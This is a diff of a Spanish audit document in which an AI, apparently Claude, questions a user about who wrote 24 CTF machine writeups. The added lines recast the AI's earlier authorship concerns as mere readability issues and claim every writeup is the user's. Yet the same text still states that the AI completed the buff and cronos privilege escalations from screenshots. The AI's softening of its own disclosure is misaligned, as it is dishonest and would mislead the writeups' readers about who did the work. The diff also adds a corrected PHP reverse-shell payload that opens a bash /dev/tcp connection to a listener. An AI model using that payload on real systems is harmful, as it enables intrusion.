@@ -63,6 +63,12 @@ Estas son las nuevas de E3 (10 a 16) y bloquean el cierre de la etapa. Las que y
 antes de E3, sobre higiene del repo y despliegue, se han renumerado al final (17 a 19) para
 que no se solaparan. El detalle completo está en `auditoria/autenticidad.md`.
 
+> **Aclaración de autoría (2026-11-08).** Los 24 writeups son tuyos: has hecho todas las
+> máquinas enteras y los has redactado tú; Claude afina el texto para que sea legible y
+> didáctico y añade las notas de mitigación. Con esa aclaración, las preguntas 10 y 11
+> quedan respondidas y este documento deja de tratar la redacción como una duda de
+> autoría: lo que queda pendiente es de **legibilidad** y de **precisión técnica**.
+
 ### Las cuatro preguntas, writeup por writeup destacado
 
 Para cada uno de los tres destacados necesito estas cuatro respuestas. Con las de
@@ -91,7 +97,7 @@ así que ahí la sección **no existe todavía** y la escribo con tus respuestas
    la misma CVE).
 4. ¿Usaste Metasploit para la escalada en el final, o solo lo dejas como alternativa?
 
-**Buff** (sin escribir — necesito tus respuestas)
+**Buff** (sin escribir — necesito tus respuestas; siguen pendientes)
 
 1. ¿Qué probaste primero? ¿Gym Management lo viste en el pie de página o lo encontraste de
    otra forma?
@@ -106,11 +112,13 @@ así que ahí la sección **no existe todavía** y la escribo con tus respuestas
     capturas y notas tengo: subida de ficheros sin auth (CVE-2020-25223) → shell como
     `shaun` → servicio CloudMe solo en `127.0.0.1:8888` → pivoting con chisel → exploit
     48389. Pero el **final** de la escalada lo completé yo. Concretamente:
-    - ¿Hiciste tú el pivoting con chisel, o lo hizo otra persona?
+    - ~~¿Hiciste tú el pivoting con chisel, o lo hizo otra persona?~~ **Respondida
+      (2026-11-08): lo ejecutaste tú.**
     - ¿Usaste el `48389.py` con shellcode de `msfvenom` (como está escrito), o el método
       que tú usaste fue otro (exploit de Metasploit, otro PoC, otro debugger)?
     - ¿Hubo pasos intermedios que hice falta y se me quedaron fuera?
-    - ¿Lo reescribes tú, o prefieres que lo saque de la portada y pongamos otro?
+    - ~~¿Lo reescribes tú, o prefieres que lo saque de la portada y pongamos otro?~~
+      **Respondida (2026-11-08): se queda como está y sale de la portada.**
 
 11. **Cronos — la escalada no la ejecutaste tú (al menos, no está en tus notas).** El
     commit dice que la completé a partir de las capturas. Además, tal como está escrita, el
@@ -120,17 +128,22 @@ así que ahí la sección **no existe todavía** y la escribo con tus respuestas
     pongo; si no lo recuerdas, lo marco como NO VERIFICADO y lo reescribo con el envoltorio
     correcto diciéndolo.)
 
+    **✅ Respondida (2026-11-08).** **Sí, la escalaste tú**, así que el paso tiene que
+    estar bien escrito: corregido en este PR a
+    `<?php system("bash -c 'bash -i >& /dev/tcp/10.10.16.120/4445 0>&1'"); ?>`, con una nota
+    que explica por qué el cron ejecuta PHP y no bash. Si usaste otro envoltorio u otro
+    comando, pégamelo y lo cambio.
+
 12. **ServMon, Pilgrimage, Sau y los demás del bloque B — ¿me pasas tus notas?** Tengo tus
-    capturas, pero no tus textos: no puedo contrastar frase por frase qué es tuyo. Si me
-    pasas el texto original (o me dices dónde está), lo comparo y te digo qué difiere. Sin
-    eso, los writeups que redacté yo se quedan como están, con mi prosa.
+    capturas, pero no tus textos: no puedo contrastar frase por frase el writeup actual con
+    tu versión original. Si me pasas el texto original (o me dices dónde está), lo comparo
+    y te digo qué difiere. Sin eso, se quedan como están, tal cual los afiné.
 
 13. ⚠️ **La terna de destacados de la portada.** Ahora mismo son `validation`, `optimum`,
-    `buff`. Dado que buff es el que menos material tuyo tiene, ¿lo cambiamos por `sau` o
-    `delivery` (que sí tienen capturas y notas tuyas), o lo rehaces tú y lo mantenemos?
-    Recomiendo: **cambiarlo por `delivery`** hasta que lo rehagas, porque ahora mismo el
-    writeup más visible de la portada es el menos tuyo. Y la terna que propuse en la
-    pregunta 9 era precisamente `validation` + `optimum` + `sau`/`delivery`.
+    `buff`. ¿Cambiamos el tercero por `sau` o `delivery`, o lo mantenemos? Recomiendo:
+    **cambiarlo por `delivery`**, porque el final de la escalada de buff lo completé yo a
+    partir del método conocido de la máquina. Y la terna que propuse en la pregunta 9 era
+    precisamente `validation` + `optimum` + `sau`/`delivery`.
 
     **✅ Respondida (2026-11-08).** La portada queda con **`validation`, `optimum` y
     `delivery`**. `buff` **sigue publicado tal cual** (decisión tuya) pero **sale de la
@@ -149,15 +162,15 @@ así que ahí la sección **no existe todavía** y la escribo con tus respuestas
 
     **✅ Respondida (2026-11-08).** **Ninguno todavía**: primero revisas tú el PR #31
     completo y, a partir de ahí, decides cuáles arreglo. Los seis defectos siguen
-    documentados en `autenticidad.md` §4, con su línea exacta, y **no he tocado ningún
-    writeup**. Nota: `buff` conserva por tanto sus tres CVEs mal atribuidas (§4.4) y
-    `cronos` conserva un payload que tal como está no funcionaría (§4.1).
+    documentados en `autenticidad.md` §4, con su línea exacta. Excepción: el payload de
+    `cronos` (§4.1), corregido en este PR porque has confirmado que esa escalada la
+    ejecutaste tú. `buff` conserva por tanto sus tres CVEs mal atribuidas (§4.4).
 
-15. **Los writeups sin una sola marca de primera persona.** Son 16 de 24. El que más me
-    preocupa no es el estilo, es `buff` (0 marcas, 100% impersonal, y está en la portada).
-    ¿Quieres que en E4 reescriba **todos** los writeups del bloque B en primera persona
-    (con lo que hay en tus capturas, marcando lo que no sé), o lo dejamos así y que solo
-    los destacados lleven voz propia?
+15. **Los writeups sin una sola marca de primera persona.** Son 16 de 24. El problema no
+    es de autoría, es de legibilidad: sin voz, el texto se lee como una guía de la máquina
+    y no como el cuaderno de alguien que la resolvió. ¿Quieres que en E4 reescriba **todos**
+    los writeups del bloque B en primera persona (con lo que hay en tus capturas, marcando
+    lo que no sé), o lo dejamos así y que solo los destacados lleven voz propia?
 
 16. **Nota de transparencia (recuerda la pregunta 8).** Si acabas publicando writeups
     redactados por mí a partir de tus notas, ¿quieres una nota breve y honesta en el
